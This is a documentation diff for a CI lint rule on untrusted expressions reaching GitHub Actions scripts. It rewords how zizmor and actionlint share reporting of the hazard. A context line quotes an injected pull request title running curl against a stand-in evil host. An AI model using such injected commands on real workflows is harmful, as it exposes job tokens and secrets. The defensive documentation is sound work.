@@ -18,8 +18,9 @@ substitution knows no shell syntax. A pull request title of `"; curl evil.exampl
 a command in the job, which holds the job's token and secrets.
 
 This rule owns the hazard class of an untrusted expression reaching a script. The potentially
-untrusted `expression` messages of actionlint report the same hazard; a later change makes zizmor
-the only reporter.
+untrusted `expression` messages of actionlint report the same hazard, and the lane drops them, so
+this is the one identifier a finding of it carries and the one an exception names. The type errors
+of the `expression` kind stay actionlint's.
 
 ## Correct construction
 
